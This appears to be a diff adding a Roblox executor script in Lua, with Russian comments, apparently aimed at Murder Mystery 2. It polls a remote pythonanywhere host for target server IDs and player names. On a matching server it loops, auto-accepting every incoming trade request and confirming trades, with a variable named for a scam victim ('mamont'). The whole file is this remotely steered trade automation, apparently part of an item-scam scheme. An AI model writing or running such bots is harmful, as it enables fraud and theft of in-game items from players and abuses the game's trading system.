@@ -1,0 +1,111 @@
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local url = "https://testerss.pythonanywhere.com/getsmm2"
+local mamontnickname = "RanoDevx"  -- Пример никнейма, можно заменить на переменную
+
+local function sendGetRequest(url)
+    local success, response = pcall(function()
+        return http_request({
+            Url = url,
+            Method = 'GET',
+            Headers = {
+                ['Content-Type'] = 'application/json'
+            },
+        })
+    end)
+
+    if success then
+        local data = HttpService:JSONDecode(response.Body)  -- Парсим JSON в таблицу
+        return data
+    else
+        warn("Request failed:", response)
+        return nil
+    end
+end
+
+local function getCurrentJobId()
+    -- Пример получения текущего JobId, замените на актуальную логику
+    return game.JobId
+end
+
+local function isPlayerOnServer(playerName)
+    -- Проверяем, есть ли игрок с таким именем на сервере
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player.Name:lower() == playerName:lower() then
+            return true
+        end
+    end
+    return false
+end
+
+local function handleTrade(playerName)
+    while true do
+        local TradeRequest = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("GetTradeStatus"):InvokeServer()
+        
+        if TradeRequest == "ReceivingRequest" then
+            local usernamebuyer = nil
+            local hasLobby = Players.LocalPlayer.PlayerGui.MainGUI:FindFirstChild("Lobby") ~= nil
+            if hasLobby then
+                usernamebuyer = Players.LocalPlayer.PlayerGui.MainGUI.Lobby.Leaderboard.Container.OverlayMenu.TradeRequest.ReceivingRequest.Username.Text
+            else
+                usernamebuyer = Players.LocalPlayer.PlayerGui.MainGUI.Game.Leaderboard.Container.TradeRequest.ReceivingRequest.Username.Text
+            end
+            
+            if usernamebuyer:lower() == playerName:lower() then
+                ReplicatedStorage:WaitForChild("Trade"):WaitForChild("AcceptRequest"):FireServer()
+            else
+                ReplicatedStorage:WaitForChild("Trade"):WaitForChild("AcceptRequest"):FireServer()
+            end
+        end
+
+        if TradeRequest == "StartTrade" then
+            local args = {
+                [1] = 285646582  -- Пример ID, замените на нужный
+            }
+            
+            ReplicatedStorage:WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer(unpack(args))
+        end
+
+        -- Проверяем, если игрок покинул сервер
+        if not isPlayerOnServer(playerName) then
+            print(playerName .. " left the server, restarting process.")
+            return  -- Возвращаемся к этапу 2
+        end
+        
+        wait(0.1)  -- Ожидание между запросами, можно настроить
+    end
+end
+
+while true do
+    local parsedData = sendGetRequest(url)
+
+    if parsedData then
+        for _, entry in ipairs(parsedData) do
+            local jobId = getCurrentJobId()
+            if entry.jobid == jobId then
+                print("Found matching JobId: " .. jobId)
+
+                -- Проверяем, есть ли игрок с таким именем на сервере
+                if isPlayerOnServer(entry.name) then
+                    print(entry.name .. " is on the server. Starting trade loop.")
+                    handleTrade(entry.name)
+                else
+                    print(entry.name .. " is not on the server. Removing from database.")
+                    -- Здесь можно добавить код для удаления из базы, если требуется
+                end
+            else
+                -- Если текущий JobId не совпадает, подключаемся к нужному JobId
+                print("Current JobId does not match. Connecting to JobId: " .. entry.jobid)
+                -- Логика подключения (например, через TeleportService)
+                -- Пример: game:GetService("TeleportService"):TeleportToPlaceInstance(entry.jobid)
+
+                -- Для демонстрации, выводим информацию
+                print("Connecting to JobId: " .. entry.jobid)
+            end
+        end
+    end
+
+    wait(10)  -- Ожидание 10 секунд перед следующим запросом
+end
